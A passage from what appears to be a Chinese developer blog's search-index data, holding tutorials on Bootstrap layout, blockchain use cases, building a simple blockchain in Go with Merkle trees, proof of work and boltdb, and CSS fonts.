当breakpoint大道md后，反转两者的位置 order-2 order-md-1 --&gt; &lt;div class=\"row align-items-center content\"&gt; &lt;div class=\"col-md-6 order-2 order-md-1\"&gt; &lt;img src=\"imgs/sprinkles.png\" alt=\"\" class=\"img-fluid\"&gt; &lt;/div&gt; &lt;div class=\"col-md-6 text-center order-1 order-md-2\"&gt; &lt;div class=\"row justify-content-center\"&gt; &lt;div class=\"col-10 col-lg-8 blurb mb-5 mb-md-0\"&gt; &lt;h2&gt;MUSEUM OF CANDY&lt;/h2&gt; &lt;img src=\"imgs/lolli_icon.png\" alt=\"\" class=\"d-none d-lg-inline\"&gt; &lt;p class=\"lead\"&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit. Neque, iste molestiae beatae, maiores deserunt in voluptatibus aspernatur architecto excepturi delectus soluta? Ipsa, deleniti dolorem hic consequatur repellat eveniet quidem voluptate necessitatibus dolorum delectus minus vitae, ut, veritatis sint ipsum magnam autem nam ex deserunt debitis eaque ratione! Nobis, quidem assumenda.&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/section&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 添加js 当页面滑动时，导航栏换颜色 12","categories":[{"name":"bootstrap","slug":"bootstrap","permalink":"https://dreamerjonson.com/categories/bootstrap/"}],"tags":[{"name":"bootstrap","slug":"bootstrap","permalink":"https://dreamerjonson.com/tags/bootstrap/"}]},{"title":"区块链用例","slug":"use-blockchain","date":"2018-12-24T07:49:44.000Z","updated":"2018-12-24T15:53:34.553Z","comments":true,"path":"2018/12/24/use-blockchain/","link":"","permalink":"https://dreamerjonson.com/2018/12/24/use-blockchain/","excerpt":"","text":"Civil旨在使记者及其支持者能够更直接，更透明地引入新的资助模式。构建使记者能够专注于为读者提供新闻服务的生态系统。 网址：https://civil.co/ In an interview in 2015, Vitalik Buterin founder of the Ethereum Platform said: “Whereas most technologies tend to automate workers on the periphery doing menial tasks, blockchains automate away the center. Instead of putting the taxi driver out of a job, blockchain puts Uber out of a job and lets the taxi drivers work with the customer directly.” DAV是一个开源软件平台，允许任何人在分散的市场中购买或出售运输服务。 DAV集成到任何交通工具（汽车，无人机，船舶）中，使这些车辆能够相互发现，交流和交易。 网址：https://dav.network/ 解决传统区块链的隐私性以及扩展性 网址：https://enigma.co/ 区块链可以为捐赠者提供捐赠使用的完全透明度。慈善机构可以使用这项技术接受和记录交易，而无需第三方，从而提高效率，节省成本并增加捐助者的信任。项目的一个例子：ALICE alice利用区块链技术向捐赠者展示他们的钱所产生的影响。 捐赠者可以冻结他们的捐款，直到他们选择的慈善机构能够证明他们已经实现了他们的捐赠目标。使用此工具，您将确保捐助的钱被使用到了正确的地方，或者您将获得退款。 网址：https://alice.si/ 对于全世界的小企业和企业家而言，获得信贷始终是一项巨大的挑战。 在发展中国家，这导致无法获得传统金融服务或仅以过高的利率提供当地现金贷款。 实现这些投资是这些社区发展的基础。 空间项目的一个例子：Ethichub EthicHub旨在实现财务民主化，为每个人提供信贷和投资机会。 小型和无银行账户的生产者可以从较低的利率和更多的流动性中受益，这将使他们能够提高生产率，增加利润并带来更好的生活质量。 网址：https://ethichub.com/ 能源部门正在通过区块链和物联网项目蓬勃发展。 交易的完全透明性使得结算速度接近实时，同时减少中间人数量，简化流程并最终提高运营效率。 有些项目可以利用采矿设备产生的余热来为家庭，游泳池甚至鱼类和植物农场供暖！ 一个有趣的项目：Power Ledger Power Ledger的使命是让世界各地的个人和社区能够获得低成本，可靠和可再生的电力。 该项目利用区块链技术，允许买家选择他们想要使用的电力来源和产生剩余电力的家庭，以便与邻居进行交易，获得公平的回报。 网址：https://www.powerledger.io/ 2017年，世界银行估计全球有超过10亿人无法正式证明自己的身份，这对于获得医疗保健，教育，金融和其他基本服务至关重要。同样，金融包容性被视为减少贫困的关键，但全球仍有20亿人没有银行账户。这使他们无法安全地交易金钱，获取保险或建立信用记录以供将来借款。 区块链可以帮助提供数字身份，消除汇款剽窃，防止人口贩运，并提供一种在通货膨胀率达到不可持续水平的国家储值的方法。 Building Blocks是联合国世界粮食计划署推出的一个项目，该项目利用眼睛扫描和区块链技术相结合，使难民营中的现金转移更快，更便宜，更安全。 在该项目的发明者MIT技术评论的采访中，Houman Haddad解释了他的愿景：“使用这种系统的叙利亚难民可以重新获得在他们逃离家园时丢失的文件和资产的合法身份。在这种情况下，难民可以很容易地证明他的教育证书，证明他与子女的关系，并获得贷款来创业。“ VoteWatcher由Nick Spanos创立，其使命是通过提供世界上技术最先进，最可靠和最安全的投票机制，为现代选举系统带来完全的透明度并赋予每个声音权力。 网址：http://votewatcher.com/ 今年早些时候，联合国宣布帮助建立一个名为Climate Chain Coalition（CCC）的新组织。 该全球倡议旨在支持成员之间的合作，推进区块链，以帮助动员气候融资 网址：https://www.climatechaincoalition.io/","categories":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/categories/区块链原理/"}],"tags":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/tags/区块链原理/"}]},{"title":"go实现区块链[2]-整合默克尔树+POW","slug":"gobuildblockchain-2-merklePOW","date":"2018-12-16T14:17:56.000Z","updated":"2018-12-16T14:30:49.333Z","comments":true,"path":"2018/12/16/gobuildblockchain-2-merklePOW/","link":"","permalink":"https://dreamerjonson.com/2018/12/16/gobuildblockchain-2-merklePOW/","excerpt":"","text":"添加merkleRoot merkleTree.go 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package mainimport \"crypto/sha256\"//默克尔树节点type MerkleTree struct&#123; RootNode *MerkleNode&#125;//默克尔根节点type MerkleNode struct&#123; Left *MerkleNode Right *MerkleNode Data []byte&#125;//生成默克尔树中的节点，如果是叶子节点，则Left，right为nil ，如果为非叶子节点，根据Left，right生成当前节点的hashfunc NewMerkleNode(left,right *MerkleNode,data []byte) *MerkleNode&#123; mnode := MerkleNode&#123;&#125; if left ==nil &amp;&amp; right==nil&#123; mnode.Data = data &#125;else&#123; prevhashes := append(left.Data,right.Data...) firsthash:= sha256.Sum256(prevhashes) hash:=sha256.Sum256(firsthash[:]) mnode.Data = hash[:] &#125; mnode.Left = left mnode.Right = right return &amp;mnode&#125;//构建默克尔树func NewMerkleTree(data [][]byte) *MerkleTree&#123; var nodes []MerkleNode //构建叶子节点。 for _,datum := range data&#123; node:= NewMerkleNode(nil,nil,datum) nodes = append(nodes,*node) &#125; //j代表的是某一层的第一个元素 j:=0 //第一层循环代表 nSize代表某一层的个数，每循环一次减半 for nSize :=len(data);nSize &gt;1;nSize = (nSize+1)/2&#123; //第二条循环i+=2代表两两拼接。 i2是为了当个数是基数的时候，拷贝最后的元素。 for i:=0 ; i&lt;nSize ;i+=2&#123; i2 := min(i+1,nSize-1) node := NewMerkleNode(&amp;nodes[j+i],&amp;nodes[j+i2],nil) nodes = append(nodes,*node) &#125; //j代表的是某一层的第一个元素 j+=nSize &#125; mTree := MerkleTree&#123;&amp;(nodes[len(nodes)-1])&#125; return &amp;mTree&#125; 根据交易创建merkleROOT 12345678910111213func (b*Block) createMerkelTreeRoot(transations []*Transation)&#123; var tranHash [][]byte for _,tx:= range transations&#123; tranHash = append(tranHash,tx.Hash()) &#125; mTree := NewMerkleTree(tranHash) b.Merkleroot = mTree.RootNode.Data&#125; 测试merkle 123456789101112131415161718192021222324252627282930313233func TestCreateMerkleTreeRoot()&#123; //初始化区块 block := &amp;Block&#123; 2, []byte&#123;&#125;, []byte&#123;&#125;, []byte&#123;&#125;, 1418755780, 404454260, 0, []*Transation&#123;&#125;, &#125; txin := TXInput&#123;[]byte&#123;&#125;,-1,nil&#125; txout := NewTXOutput(subsidy,\"first\") tx := Transation&#123;nil,[]TXInput&#123;txin&#125;,[]TXOutput&#123;*txout&#125;&#125; txin2 := TXInput&#123;[]byte&#123;&#125;,-1,nil&#125; txout2 := NewTXOutput(subsidy,\"second\") tx2 := Transation&#123;nil,[]TXInput&#123;txin2&#125;,[]TXOutput&#123;*txout2&#125;&#125; var Transations []*Transation Transations = append(Transations,&amp;tx,&amp;tx2) block.createMerkelTreeRoot(Transations) fmt.Printf(\"%x\\n\",block.Merkleroot)&#125; 增加挖矿逻辑 proofofwork.go: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package mainimport ( \"math/big\" \"bytes\" \"crypto/sha256\")type ProofOfWork struct&#123; block * Block tartget * big.Int&#125;const targetBits = 16func NewProofofWork(b*Block) * ProofOfWork&#123; target := big.NewInt(1) target.Lsh(target,uint(256-targetBits)) pow := &amp;ProofOfWork&#123;b,target&#125; return pow&#125;func (pow * ProofOfWork) prepareData(nonce int32) []byte&#123; data := bytes.Join( [][]byte&#123; IntToHex(pow.block.Version), pow.block.PrevBlockHash, pow.block.Merkleroot, IntToHex(pow.block.Time), IntToHex(pow.block.Bits), IntToHex(nonce)&#125;, []byte&#123;&#125;, ) return data&#125;func (pow * ProofOfWork) Run() (int32,[]byte)&#123; var nonce int32 var secondhash [32]byte nonce = 0 var currenthash big.Int for nonce &lt; maxnonce&#123; //序列化 data:= pow.prepareData(nonce) //double hash fitstHash := sha256.Sum256(data) secondhash = sha256.Sum256(fitstHash[:]) // fmt.Printf(\"%x\\n\",secondhash) currenthash.SetBytes(secondhash[:]) //比较 if currenthash.Cmp(pow.tartget) == -1&#123; break &#125;else&#123; nonce++ &#125; &#125; return nonce,secondhash[:]&#125;func (pow * ProofOfWork) Validate() bool&#123; var hashInt big.Int data:=pow.prepareData(pow.block.Nonce) fitstHash := sha256.Sum256(data) secondhash := sha256.Sum256(fitstHash[:]) hashInt.SetBytes(secondhash[:]) isValid:= hashInt.Cmp(pow.tartget) == -1 return isValid&#125; 测试： 12345678910111213141516171819202122func TestPow()&#123; //初始化区块 block := &amp;Block&#123; 2, []byte&#123;&#125;, []byte&#123;&#125;, []byte&#123;&#125;, 1418755780, 404454260, 0, []*Transation&#123;&#125;, &#125; pow:=NewProofofWork(block) nonce,_:= pow.Run() block.Nonce = nonce fmt.Println(\"POW:\",pow.Validate())&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go实现区块链[1]-block","slug":"gobuildblockchain-1-block","date":"2018-12-16T13:54:50.000Z","updated":"2018-12-16T14:16:47.171Z","comments":true,"path":"2018/12/16/gobuildblockchain-1-block/","link":"","permalink":"https://dreamerjonson.com/2018/12/16/gobuildblockchain-1-block/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546//定义区块结构体type Block struct&#123; Version int32 PrevBlockHash []byte Merkleroot []byte Hash []byte Time int32 Bits int32 Nonce int32&#125;//序列化func (b* Block) Serialize() []byte&#123; var encoded bytes.Buffer enc:= gob.NewEncoder(&amp;encoded) err:= enc.Encode(b) if err!=nil&#123; log.Panic(err) &#125; return encoded.Bytes()&#125;//反序列化func DeserializeBlock(d []byte) *Block&#123; var block Block decode :=gob.NewDecoder(bytes.NewReader(d)) err := decode.Decode(&amp;block) if err!=nil&#123; log.Panic(err) &#125; return &amp;block&#125;//打印区块func (b*Block)String()&#123; fmt.Printf(\"version:%s\\n\",strconv.FormatInt(int64(b.Version),10)) fmt.Printf(\"Prev.BlockHash:%x\\n\",b.PrevBlockHash) fmt.Printf(\"Prev.merkleroot:%x\\n\",b.Merkleroot) fmt.Printf(\"Prev.Hash:%x\\n\",b.Hash) fmt.Printf(\"Time:%s\\n\",strconv.FormatInt(int64(b.Time),10)) fmt.Printf(\"Bits:%s\\n\",strconv.FormatInt(int64(b.Bits),10)) fmt.Printf(\"nonce:%s\\n\",strconv.FormatInt(int64(b.Nonce),10))&#125; 打印区块、测试序列化 1234567891011121314151617181920func TestNewSerialize()&#123; //初始化区块 block := &amp;Block&#123; 2, []byte&#123;&#125;, []byte&#123;&#125;, []byte&#123;&#125;, 1418755780, 404454260, 0, []*Transation&#123;&#125;, &#125; deBlock:=DeserializeBlock(block.Serialize()) deBlock.String()&#125; 添加交易 transition.go 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798package mainimport ( \"fmt\" \"strings\" \"bytes\" \"encoding/gob\" \"log\" \"crypto/sha256\")//挖矿奖励const subsidy = 100//交易type Transation struct&#123; ID []byte Vin []TXInput Vout []TXOutput&#125;//输入type TXInput struct &#123; TXid []byte Voutindex int Signature []byte&#125;//输出type TXOutput struct &#123; value int PubkeyHash []byte&#125;//打印func (tx Transation) String() string &#123; var lines []string lines = append(lines, fmt.Sprintf(\"--- Transaction %x:\", tx.ID)) for i, input := range tx.Vin &#123; lines = append(lines, fmt.Sprintf(\" Input %d:\", i)) lines = append(lines, fmt.Sprintf(\" TXID: %x\", input.TXid)) lines = append(lines, fmt.Sprintf(\" Out: %d\", input.Voutindex)) lines = append(lines, fmt.Sprintf(\" Signature: %x\", input.Signature)) &#125; for i, output := range tx.Vout &#123; lines = append(lines, fmt.Sprintf(\" Output %d:\", i)) lines = append(lines, fmt.Sprintf(\" Value: %d\", output.value)) lines = append(lines, fmt.Sprintf(\" Script: %x\", output.PubkeyHash)) &#125; return strings.Join(lines, \"\\n\")&#125;//序列化func (tx Transation) Serialize() []byte&#123; var encoded bytes.Buffer enc:= gob.NewEncoder(&amp;encoded) err:= enc.Encode(tx) if err!=nil&#123; log.Panic(err) &#125; return encoded.Bytes()&#125;//计算交易的hash值func (tx *Transation) Hash() []byte&#123; txcopy := *tx txcopy.ID = []byte&#123;&#125; hash:= sha256.Sum256(txcopy.Serialize()) return hash[:]&#125;//根据金额与地址新建一个输出func NewTXOutput(value int,address string) * TXOutput&#123; txo := &amp;TXOutput&#123;value,nil&#125; txo.PubkeyHash = []byte(address) return txo&#125;//第一笔coinbase交易func NewCoinbaseTX(to string) *Transation&#123; txin := TXInput&#123;[]byte&#123;&#125;,-1,nil&#125; txout := NewTXOutput(subsidy,to) tx:= Transation&#123;nil,[]TXInput&#123;txin&#125;,[]TXOutput&#123;*txout&#125;&#125; tx.ID = tx.Hash() return &amp;tx&#125; 工具类 utils.go 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( \"bytes\" \"encoding/binary\" \"log\")//计算两个数的最小值func min(a int,b int) int&#123; if(a&gt;b)&#123; return b &#125; return a&#125;//将类型转化为了字节数组,小端func IntToHex(num int32) []byte&#123; buff := new(bytes.Buffer) //binary.LittleEndian 小端模式 err:= binary.Write(buff,binary.LittleEndian,num) if err!=nil&#123; log.Panic(err) &#125; return buff.Bytes()&#125;//将类型转化为了字节数组，大端func IntToHex2(num int32) []byte&#123; buff := new(bytes.Buffer) //binary.LittleEndian 小端模式 err:= binary.Write(buff,binary.BigEndian,num) if err!=nil&#123; log.Panic(err) &#125; return buff.Bytes()&#125;//字节反转func ReverseBytes(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125; 修改区块 block.go 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//增加交易type Block struct&#123; Version int32 PrevBlockHash []byte Merkleroot []byte Hash []byte Time int32 Bits int32 Nonce int32 Transations []*Transation&#125;//根据前一个hash增加区块func NewBlock(prevBlockHash []byte) * Block&#123; block := &amp;Block&#123; 2, prevBlockHash, []byte&#123;&#125;, []byte&#123;&#125;, int32(time.Now().Unix()), 404454260, 0, []*Transation&#123;&#125;, &#125; pow := NewProofofWork(block) nonce,hash := pow.Run() block.Hash = hash block.Nonce = nonce return block&#125;//创世区块func NewGensisBlock() * Block&#123; block := &amp;Block&#123; 2, []byte&#123;&#125;, []byte&#123;&#125;, []byte&#123;&#125;, int32(time.Now().Unix()), 404454260, 0, []*Transation&#123;&#125;, &#125; pow:=NewProofofWork(block) nonce,hash:=pow.Run() block.Nonce = nonce block.Hash = hash //block.String() return block&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go实现区块链[4]-遍历区块链与数据库持久化(下)","slug":"gobuildblockchain-4-iterator","date":"2018-12-16T13:31:31.000Z","updated":"2018-12-16T14:30:09.253Z","comments":true,"path":"2018/12/16/gobuildblockchain-4-iterator/","link":"","permalink":"https://dreamerjonson.com/2018/12/16/gobuildblockchain-4-iterator/","excerpt":"","text":"遍历区块链 blockchain.go完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136package mainimport ( \"github.com/boltdb/bolt\" \"log\" \"fmt\")const dbFile = \"blockchain.db\"const blockBucket = \"blocks\"type Blockchain struct&#123; tip []byte //最近的一个区块的hash值 db * bolt.DB&#125;type BlockChainIterateor struct&#123; currenthash []byte db * bolt.DB&#125;func (bc * Blockchain) AddBlock()&#123; var lasthash []byte err := bc.db.View(func(tx * bolt.Tx) error&#123; b:= tx.Bucket([]byte(blockBucket)) lasthash = b.Get([]byte(\"l\")) return nil &#125;) if err!=nil&#123; log.Panic(err) &#125; newBlock := NewBlock(lasthash) bc.db.Update(func(tx *bolt.Tx) error &#123; b:=tx.Bucket([]byte(blockBucket)) err:= b.Put(newBlock.Hash,newBlock.Serialize()) if err!=nil&#123; log.Panic(err) &#125; err = b.Put([]byte(\"l\"),newBlock.Hash) if err!=nil&#123; log.Panic(err) &#125; bc.tip = newBlock.Hash return nil &#125;)&#125;func NewBlockchain() * Blockchain&#123; var tip []byte db,err := bolt.Open(dbFile,0600,nil) if err!=nil&#123; log.Panic(err) &#125; err = db.Update(func(tx * bolt.Tx) error&#123; b:= tx.Bucket([]byte(blockBucket)) if b==nil&#123; fmt.Println(\"区块链不存在，创建一个新的区块链\") genesis := NewGensisBlock() b,err:=tx.CreateBucket([]byte(blockBucket)) if err!=nil&#123; log.Panic(err) &#125; err = b.Put(genesis.Hash,genesis.Serialize()) if err!=nil&#123; log.Panic(err) &#125; err = b.Put([]byte(\"l\"),genesis.Hash) tip = genesis.Hash &#125;else&#123; tip = b.Get([]byte(\"l\")) &#125; return nil &#125;) if err!=nil&#123; log.Panic(err) &#125; bc:=Blockchain&#123;tip,db&#125; return &amp;bc&#125;func (bc * Blockchain) iterator() * BlockChainIterateor&#123; bci := &amp;BlockChainIterateor&#123;bc.tip,bc.db&#125; return bci&#125;func (i * BlockChainIterateor) Next() * Block&#123; var block *Block err:= i.db.View(func(tx *bolt.Tx) error &#123; b:=tx.Bucket([]byte(blockBucket)) deblock := b.Get(i.currenthash) block = DeserializeBlock(deblock) return nil &#125;) if err!=nil&#123; log.Panic(err) &#125; i.currenthash = block.PrevBlockHash return block&#125;func (bc * Blockchain) printBlockchain()&#123; bci:=bc.iterator() for&#123; block:= bci.Next() block.String() fmt.Println() //fmt.Printf(\"长度：%d\\n\",len(block.PrevBlockHash)) if len(block.PrevBlockHash)==0&#123; break &#125; &#125;&#125; 测试 12345678910func TestBoltDB()&#123; blockchain := NewBlockchain() blockchain.AddBlock() blockchain.AddBlock() blockchain.printBlockchain()&#125;func main()&#123; TestBoltDB()&#125; 第一次执行执行： go build . ./buildingBlockChain 123456789101112131415161718192021222324区块链不存在，创建一个新的区块链version:2Prev.BlockHash:0000349e762f37b4f79f23c5270066cb2963610f5a6c999a846b781cec3152bcPrev.merkleroot:Prev.Hash:0000deb768a8e6c520081051d28756578c4c666bde404ff282d7a8e41a1e0107Time:1544966755Bits:404454260nonce:13075version:2Prev.BlockHash:0000fdcb6bd475c8275ab47ac6d8d97ab2644ae33d574a914d36f9c1024099ebPrev.merkleroot:Prev.Hash:0000349e762f37b4f79f23c5270066cb2963610f5a6c999a846b781cec3152bcTime:1544966755Bits:404454260nonce:142155version:2Prev.BlockHash:Prev.merkleroot:Prev.Hash:0000fdcb6bd475c8275ab47ac6d8d97ab2644ae33d574a914d36f9c1024099ebTime:1544966755Bits:404454260nonce:105247 再次执行./buildingBlockChain 123456789101112131415161718192021222324252627282930313233343536373839version:2Prev.BlockHash:0000c336d1f0284faac173c1d68ca196b3f2e94684d12f201b2610aca39acc7bPrev.merkleroot:Prev.Hash:0000a00ab59ad06d7c5d29e9769171676705c270d9edb1e5bd4b39da41e0d40cTime:1544966858Bits:404454260nonce:67063version:2Prev.BlockHash:0000deb768a8e6c520081051d28756578c4c666bde404ff282d7a8e41a1e0107Prev.merkleroot:Prev.Hash:0000c336d1f0284faac173c1d68ca196b3f2e94684d12f201b2610aca39acc7bTime:1544966858Bits:404454260nonce:69856version:2Prev.BlockHash:0000349e762f37b4f79f23c5270066cb2963610f5a6c999a846b781cec3152bcPrev.merkleroot:Prev.Hash:0000deb768a8e6c520081051d28756578c4c666bde404ff282d7a8e41a1e0107Time:1544966755Bits:404454260nonce:13075version:2Prev.BlockHash:0000fdcb6bd475c8275ab47ac6d8d97ab2644ae33d574a914d36f9c1024099ebPrev.merkleroot:Prev.Hash:0000349e762f37b4f79f23c5270066cb2963610f5a6c999a846b781cec3152bcTime:1544966755Bits:404454260nonce:142155version:2Prev.BlockHash:Prev.merkleroot:Prev.Hash:0000fdcb6bd475c8275ab47ac6d8d97ab2644ae33d574a914d36f9c1024099ebTime:1544966755Bits:404454260nonce:105247","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go实现区块链[3]-遍历区块链与数据库持久化","slug":"gobuildblockchain-3-boltDB","date":"2018-12-16T12:18:16.000Z","updated":"2018-12-16T14:26:28.543Z","comments":true,"path":"2018/12/16/gobuildblockchain-3-boltDB/","link":"","permalink":"https://dreamerjonson.com/2018/12/16/gobuildblockchain-3-boltDB/","excerpt":"","text":"新建blockchain.go 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package mainimport ( \"github.com/boltdb/bolt\" \"log\" \"fmt\")const dbFile = \"blockchain.db\"const blockBucket = \"blocks\"type Blockchain struct&#123; tip []byte //最近的一个区块的hash值 db * bolt.DB&#125;func (bc * Blockchain) AddBlock()&#123; var lasthash []byte err := bc.db.View(func(tx * bolt.Tx) error&#123; b:= tx.Bucket([]byte(blockBucket)) lasthash = b.Get([]byte(\"l\")) return nil &#125;) if err!=nil&#123; log.Panic(err) &#125; newBlock := NewBlock(lasthash) bc.db.Update(func(tx *bolt.Tx) error &#123; b:=tx.Bucket([]byte(blockBucket)) err:= b.Put(newBlock.Hash,newBlock.Serialize()) if err!=nil&#123; log.Panic(err) &#125; err = b.Put([]byte(\"l\"),newBlock.Hash) if err!=nil&#123; log.Panic(err) &#125; bc.tip = newBlock.Hash return nil &#125;)&#125;func NewBlockchain() * Blockchain&#123; var tip []byte db,err := bolt.Open(dbFile,0600,nil) if err!=nil&#123; log.Panic(err) &#125; err = db.Update(func(tx * bolt.Tx) error&#123; b:= tx.Bucket([]byte(blockBucket)) if b==nil&#123; fmt.Println(\"区块链不存在，创建一个新的区块链\") genesis := NewGensisBlock() b,err:=tx.CreateBucket([]byte(blockBucket)) if err!=nil&#123; log.Panic(err) &#125; err = b.Put(genesis.Hash,genesis.Serialize()) if err!=nil&#123; log.Panic(err) &#125; err = b.Put([]byte(\"l\"),genesis.Hash) tip = genesis.Hash &#125;else&#123; tip = b.Get([]byte(\"l\")) &#125; return nil &#125;) if err!=nil&#123; log.Panic(err) &#125; bc:=Blockchain&#123;tip,db&#125; return &amp;bc&#125; 增加newBlock的方法，根据前一个区块的hash创建区块： 12345678910111213141516171819202122func NewBlock(prevBlockHash []byte) * Block&#123; block := &amp;Block&#123; 2, prevBlockHash, []byte&#123;&#125;, []byte&#123;&#125;, int32(time.Now().Unix()), 404454260, 0, []*Transation&#123;&#125;, &#125; pow := NewProofofWork(block) nonce,hash := pow.Run() block.Hash = hash block.Nonce = nonce return block&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"css-关于字体的使用+ 谷歌字体","slug":"css-font","date":"2018-12-16T08:50:52.000Z","updated":"2018-12-30T13:15:31.769Z","comments":true,"path":"2018/12/16/css-font/","link":"","permalink":"https://dreamerjonson.com/2018/12/16/css-font/","excerpt":"","text":"源文件 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Fonts&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"styles.css\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Fonts Demo Page&lt;/h1&gt;asjdhaklsdjasdkljalsd&lt;p&gt;Bacon ipsum dolor amet short loin &lt;span&gt;strip steak&lt;/span&gt; leberkas ribeye beef pork loin pork belly drumstick frankfurter. Corned beef ball tip pork belly pig sirloin, ham hock chuck cow fatback strip steak meatloaf. Biltong swine ball tip kielbasa picanha pork chop bacon pork boudin rump ribeye pig. Shoulder ribeye drumstick short ribs pork loin venison. Chuck andouille turducken, kielbasa t-bone short ribs beef ribs turkey doner swine pork chop biltong.&lt;/p&gt;&lt;p&gt;Shoulder shank bacon salami flank tenderloin. Ground round pig hamburger, jerky bacon meatball chuck pancetta kielbasa bresaola turkey prosciutto. Prosciutto hamburger shank brisket strip steak turducken picanha ground round chicken. Tenderloin shank chicken ham hock, pork chop ball tip pork belly jowl porchetta. Strip steak cupim tenderloin pastrami rump shoulder filet mignon tri-tip.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; CSS文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/*font-family*//*https://www.cssfontstack.com/*/p &#123; font-family: Arial;&#125;h1 &#123; font-family: Georgia;&#125;/*font-size*/body &#123; font-size: 10px;&#125;/*相对于母亲元素的倍数*/h1 &#123; font-size: 5.0em;&#125;p &#123; font-size: 2.0em;&#125;span &#123; font-size: 2.0em;&#125;/*font-weight*/p&#123; font-weight: normal;&#125;/*line-height 类似于word的1.5倍行距*/p &#123; line-height: 1.5;&#125;/*text-align*/h1 &#123; text-align: right;&#125;p &#123; text-align: center;&#125;/*text-decoration*/p &#123; text-decoration: underline;&#125;/*贯穿线*/h1 &#123; text-decoration: line-through;&#125; 谷歌字体的使用 指导：https://fonts.google.com/ 使用的一个例子 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Fonts&lt;/title&gt; &lt;link href=\"https://fonts.googleapis.com/css?family=Charm\" rel=\"stylesheet\"&gt; &lt;style type=\"text/css\"&gt; /*font-family*//*https://www.cssfontstack.com/*/p &#123; font-family: Arial;&#125;h1 &#123; font-family: 'Charm', cursive;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Fonts Demo Page&lt;/h1&gt;asjdhaklsdjasdkljalsd&lt;p&gt;Bacon ipsum dolor amet short loin &lt;span&gt;strip steak&lt;/span&gt; leberkas ribeye beef pork loin pork belly drumstick frankfurter. Corned beef ball tip pork belly pig sirloin, ham hock chuck cow fatback strip steak meatloaf. Biltong swine ball tip kielbasa picanha pork chop bacon pork boudin rump ribeye pig. Shoulder ribeye drumstick short ribs pork loin venison. Chuck andouille turducken, kielbasa t-bone short ribs beef ribs turkey doner swine pork chop biltong.&lt;/p&gt;&lt;p&gt;Shoulder shank bacon salami flank tenderloin. Ground round pig hamburger, jerky bacon meatball chuck pancetta kielbasa bresaola turkey prosciutto. Prosciutto hamburger shank brisket strip steak turducken picanha ground round chicken. Tenderloin shank chicken ham hock, pork chop ball tip pork belly jowl porchetta. Strip steak cupim tenderloin pastrami rump shoulder filet mignon tri-tip.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; fontawesome awesomeCDN：https://fontawesome.com/start 网站：https://fontawesome.com 字体大小：https://fontawesome.com/how-to-use/on-the-web/styling/sizing-icons 使用例子： 123&lt;link rel=\"stylesheet\" href=\"https://use.fontawesome.com/releases/v5.6.3/css/all.css\" integrity=\"sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/\" crossorigin=\"anonymous\"&gt;&lt;!-- fa-2x为两倍大小 --&gt;&lt;i class=\"far fa-thumbs-up 